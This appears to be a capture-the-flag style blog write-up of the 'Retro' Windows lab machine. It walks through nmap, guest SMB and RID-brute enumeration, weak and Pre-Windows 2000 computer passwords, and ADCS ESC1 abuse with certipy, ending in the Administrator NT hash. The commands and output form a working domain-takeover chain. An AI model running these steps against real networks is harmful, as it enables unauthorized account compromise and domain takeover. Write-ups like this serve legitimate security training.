@@ -1,0 +1,234 @@
+<h1 id="Retro-Windows-Easy"><a href="#Retro-Windows-Easy" class="headerlink" title="Retro (Windows Easy)"></a>Retro (Windows Easy)</h1><p>Retro is a box working around pre-created windows 2000 machines. Pre-creating a computer means adding a computer to AD without using it to join a host to the domain right away, it just gets used later. There is a “Pre-Windows 2000” compatibility option that can be selected when creating a computer from ADUC, still present in Windows Server 2022. A computer created with this option will have a password equal to the computers name in lowercase without the ‘$’. This allows you to look at ADCS templates being used that are vulnerable, which leads to privilege escalation to Administrator.</p>
+<p><a href="https://medium.com/@offsecdeer/finding-weak-ad-computer-passwords-e3dc1ed220df">Resource from Medium</a></p>
+<h2 id="Initial-Nmap"><a href="#Initial-Nmap" class="headerlink" title="Initial Nmap"></a>Initial Nmap</h2><pre><code># Nmap 7.94SVN scan initiated Wed Nov  6 22:09:30 2024 as: /usr/lib/nmap/nmap -v -sVC -oN Evidence/Scans/initial.log 10.10.111.122
+Nmap scan report for 10.10.111.122
+Host is up (0.17s latency).
+Not shown: 988 filtered tcp ports (no-response)
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-07 03:09:44Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+| Issuer: commonName=retro-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-07T02:57:49
+| Not valid after:  2025-11-07T02:57:49
+| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60
+|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21
+|_ssl-date: TLS randomness does not represent time
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+| Issuer: commonName=retro-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-07T02:57:49
+| Not valid after:  2025-11-07T02:57:49
+| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60
+|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21
+|_ssl-date: TLS randomness does not represent time
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+| Issuer: commonName=retro-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-07T02:57:49
+| Not valid after:  2025-11-07T02:57:49
+| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60
+|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21
+|_ssl-date: TLS randomness does not represent time
+3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: retro.vl0., Site: Default-First-Site-Name)
+|_ssl-date: TLS randomness does not represent time
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+| Issuer: commonName=retro-DC-CA
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-07T02:57:49
+| Not valid after:  2025-11-07T02:57:49
+| MD5:   2c4d:c0bb:3468:05c5:2f7b:1984:85e4:ad60
+|_SHA-1: fa13:b4c6:4349:42d2:5dd4:1948:c4be:aacf:8fd7:da21
+3389/tcp open  ms-wbt-server Microsoft Terminal Services
+| rdp-ntlm-info:
+|   Target_Name: RETRO
+|   NetBIOS_Domain_Name: RETRO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: retro.vl
+|   DNS_Computer_Name: DC.retro.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-11-07T03:10:26+00:00
+|_ssl-date: 2024-11-07T03:11:05+00:00; -3s from scanner time.
+| ssl-cert: Subject: commonName=DC.retro.vl
+| Issuer: commonName=DC.retro.vl
+| Public Key type: rsa
+| Public Key bits: 2048
+| Signature Algorithm: sha256WithRSAEncryption
+| Not valid before: 2024-11-06T03:06:43
+| Not valid after:  2025-05-08T03:06:43
+| MD5:   c32f:b344:a02e:2e77:7748:ca98:4f8e:3c20
+|_SHA-1: 2648:a57a:ffb0:819b:49a5:3f89:6fc2:54f2:9266:4e0b
+Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   date: 2024-11-07T03:10:30
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+|_clock-skew: mean: -2s, deviation: 0s, median: -2s
+
+Read data files from: /usr/share/nmap
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+# Nmap done at Wed Nov  6 22:11:10 2024 -- 1 IP address (1 host up) scanned in 100.09 seconds
+</code></pre>
+<h2 id="SMB"><a href="#SMB" class="headerlink" title="SMB"></a>SMB</h2><p>Since we have the standard SMB open. Lets check that. Maybe we’ll get lucky.</p>
+<pre><code>カケス  retro-win nxc smb retro.vl -u jay -p &#39;&#39; --shares
+SMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)
+SMB         10.10.93.157    445    DC               [*] Enumerated shares
+SMB         10.10.93.157    445    DC               Share           Permissions     Remark
+SMB         10.10.93.157    445    DC               -----           -----------     ------
+SMB         10.10.93.157    445    DC               ADMIN$                          Remote Admin
+SMB         10.10.93.157    445    DC               C$                              Default share
+SMB         10.10.93.157    445    DC               IPC$            READ            Remote IPC
+SMB         10.10.93.157    445    DC               NETLOGON                        Logon server share
+SMB         10.10.93.157    445    DC               Notes
+SMB         10.10.93.157    445    DC               SYSVOL                          Logon server share
+SMB         10.10.93.157    445    DC               Trainees        READ
+</code></pre>
+<p>So let’s get some Trainees stuff. 😂😂</p>
+<p><img src="/image.png" alt="alt text"></p>
+<p>This only had one item and it read like this:</p>
+<p><img src="/image-1.png" alt="alt text"></p>
+<p>So instead of password resetting there playing minecraft. Got it!! 👍</p>
+<p>I wanted to see, since we have guest auth, if we can get some users by bruting their rid with <code>nxc</code>.</p>
+<pre><code>カケス  retronxc smb retro.vl -u jay -p &#39;&#39;  --rid-brute
+SMB         10.10.93.157    445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:retro.vl) (signing:True) (SMBv1:False)
+SMB         10.10.93.157    445    DC               [+] retro.vl\jay: (Guest)
+SMB         10.10.93.157    445    DC               498: RETRO\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.93.157    445    DC               500: RETRO\Administrator (SidTypeUser)
+SMB         10.10.93.157    445    DC               501: RETRO\Guest (SidTypeUser)
+SMB         10.10.93.157    445    DC               502: RETRO\krbtgt (SidTypeUser)
+SMB         10.10.93.157    445    DC               512: RETRO\Domain Admins (SidTypeGroup)
+SMB         10.10.93.157    445    DC               513: RETRO\Domain Users (SidTypeGroup)
+SMB         10.10.93.157    445    DC               514: RETRO\Domain Guests (SidTypeGroup)
+SMB         10.10.93.157    445    DC               515: RETRO\Domain Computers (SidTypeGroup)
+SMB         10.10.93.157    445    DC               516: RETRO\Domain Controllers (SidTypeGroup)
+SMB         10.10.93.157    445    DC               517: RETRO\Cert Publishers (SidTypeAlias)
+SMB         10.10.93.157    445    DC               518: RETRO\Schema Admins (SidTypeGroup)
+SMB         10.10.93.157    445    DC               519: RETRO\Enterprise Admins (SidTypeGroup)
+SMB         10.10.93.157    445    DC               520: RETRO\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.10.93.157    445    DC               521: RETRO\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.10.93.157    445    DC               522: RETRO\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.10.93.157    445    DC               525: RETRO\Protected Users (SidTypeGroup)
+SMB         10.10.93.157    445    DC               526: RETRO\Key Admins (SidTypeGroup)
+SMB         10.10.93.157    445    DC               527: RETRO\Enterprise Key Admins (SidTypeGroup)
+SMB         10.10.93.157    445    DC               553: RETRO\RAS and IAS Servers (SidTypeAlias)
+SMB         10.10.93.157    445    DC               571: RETRO\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.93.157    445    DC               572: RETRO\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.10.93.157    445    DC               1000: RETRO\DC$ (SidTypeUser)
+SMB         10.10.93.157    445    DC               1101: RETRO\DnsAdmins (SidTypeAlias)
+SMB         10.10.93.157    445    DC               1102: RETRO\DnsUpdateProxy (SidTypeGroup)
+SMB         10.10.93.157    445    DC               1104: RETRO\trainee (SidTypeUser)
+SMB         10.10.93.157    445    DC               1106: RETRO\BANKING$ (SidTypeUser)
+SMB         10.10.93.157    445    DC               1107: RETRO\jburley (SidTypeUser)
+SMB         10.10.93.157    445    DC               1108: RETRO\HelpDesk (SidTypeGroup)
+SMB         10.10.93.157    445    DC               1109: RETRO\tblack (SidTypeUser)
+</code></pre>
+<p>👌👌👌 Piece of Cake.</p>
+<p>Since we got some users and Kerberos is open, LETS VALIDATE.</p>
+<p><img src="/image-2.png" alt="alt text"></p>
+<h2 id="KERBEROS"><a href="#KERBEROS" class="headerlink" title="KERBEROS"></a>KERBEROS</h2><p>See if we have some valid usernames proves useful.</p>
+<p><img src="/image-3.png" alt="alt text"></p>
+<p>Just one more thing I want to see, how good is this <code>trainee</code> password.</p>
+<p><img src="/image-4.png" alt="alt text"></p>
+<p>🤦‍♂️🤦‍♂️🤦‍♂️🤦‍♂️</p>
+<p><img src="/perfect.gif" alt="alt text"></p>
+<h2 id="SMB-as-trainee"><a href="#SMB-as-trainee" class="headerlink" title="SMB as trainee"></a>SMB as trainee</h2><p>Well, well, well……</p>
+<p><img src="/image-5.png" alt="alt text"></p>
+<p>Guess we’re gonna look at Notes.</p>
+<p><img src="/image-6.png" alt="alt text"></p>
+<p><img src="/image-7.png" alt="alt text"></p>
+<p>So this is what we saw earlier in our <code>rid-brute</code> for usernames. An account that must have been reset or disconnected but has the computer name <code>BANKING$</code> still exists.</p>
+<p>After doing some research on <code>Pre-Windows 2000</code> we find we can use the computer name as the password lowercased and with out the trailing dollar sign. But this gives us an error.</p>
+<p><img src="/image-8.png" alt="alt text"></p>
+<p>We should change the password and see some results.</p>
+<p><img src="/image-9.png" alt="alt text"></p>
+<p><img src="/image-10.png" alt="alt text"></p>
+<h2 id="Pre-Windows-2000-and-ADCS"><a href="#Pre-Windows-2000-and-ADCS" class="headerlink" title="Pre-Windows 2000 and ADCS"></a>Pre-Windows 2000 and ADCS</h2><p>So knowing this is possibly an older machine we can try to obtain exploit ADCS since we saw it from the nmap scan. </p>
+<p>With our creds from before we can try <code>Certipy</code></p>
+<p><code>certipy find -u trainee@retro.vl -p trainee -target retro.vl -stdout</code></p>
+<p>Which does reveal a vulnerable ESC1 Template. ESC1 occurs when the person enforcing the certificate can specify its Subject Alternative Name (SAN). This option allows us to impersonate any user.</p>
+<pre><code>Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Enrollment Flag                     : None
+    Private Key Flag                    : 16842752
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL\Domain Admins
+                                          RETRO.VL\Domain Computers
+                                          RETRO.VL\Enterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL\Administrator
+        Write Owner Principals          : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Dacl Principals           : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+        Write Property Principals       : RETRO.VL\Domain Admins
+                                          RETRO.VL\Enterprise Admins
+                                          RETRO.VL\Administrator
+    [!] Vulnerabilities
+      ESC1                              : &#39;RETRO.VL\\Domain Computers&#39; can enroll, enrollee supplies subject and template allows client authentication
+</code></pre>
+<p>Since we have a computer that was forgot about and we changed the creds, we’ll use that one.</p>
+<pre><code>BANKING$:Password123!
+</code></pre>
+<h1 id="We-impersonate"><a href="#We-impersonate" class="headerlink" title="We impersonate"></a>We impersonate</h1><p><img src="/impostor.gif" alt="Alt Text"></p>
+<p>Our first request wasn’t successful. Reason seems to be the KEY_LENGTH.</p>
+<p><img src="/image-11.png" alt="alt text"></p>
+<p>Let’s adjust the key size and try again.</p>
+<p><img src="/image-12.png" alt="alt text"></p>
+<p>And now we use it to authenticate and recieve the admin hash.</p>
+<pre><code>カケス  retro-win certipy auth -pfx administrator.pfx -username Administrator -domain retro.vl -dc-ip 10.10.90.201
+Certipy v4.8.2 - by Oliver Lyak (ly4k)
+
+[*] Using principal: administrator@retro.vl
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saved credential cache to &#39;administrator.ccache&#39;
+[*] Trying to retrieve NT hash for &#39;administrator&#39;
+[*] Got hash for &#39;administrator@retro.vl&#39;: aad3b435b51404eeaad3b435b51404ee:252fac7066d93dd009d4fd2cd0368389
+</code></pre>
+<p><img src="/image-13.png" alt="alt text"></p>
+<p><img src="/robocop.gif" alt="alt text"></p>
